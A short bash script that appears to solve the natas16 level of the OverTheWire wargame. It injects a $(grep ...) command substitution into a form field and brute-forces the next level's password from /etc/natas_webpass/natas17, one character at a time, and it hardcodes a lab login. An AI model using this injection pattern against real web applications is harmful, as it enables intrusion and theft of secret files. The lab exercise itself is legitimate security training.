#!/bin/bash

PASSWORD=""
TMP_FILE="temp.log"
TEST_STR="hackers"

OPTS="-s -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
DATA='needle='
PASS_FILE='/etc/natas_webpass/natas17'
URL="natas16.natas.labs.overthewire.org"

# We can probably assume the password is 32 bytes long
# This is the length of the rest of our passwords
for i in {1..32}
do
	for c in {{a..z},{A..Z},{0..9}}
	do
		# Append the output of our injected command to our test string
		curl $OPTS --data-urlencode "$DATA$TEST_STR\$(grep ^$PASSWORD$c $PASS_FILE)" $URL > $TMP_FILE

		# If our test string exists in the dictionary, it was not a match
		if grep -q $TEST_STR $TMP_FILE
		then
			continue
		else
			PASSWORD=$PASSWORD$c
			break
		fi
	done
done

rm $TMP_FILE
echo "Password: $PASSWORD"
exit 0
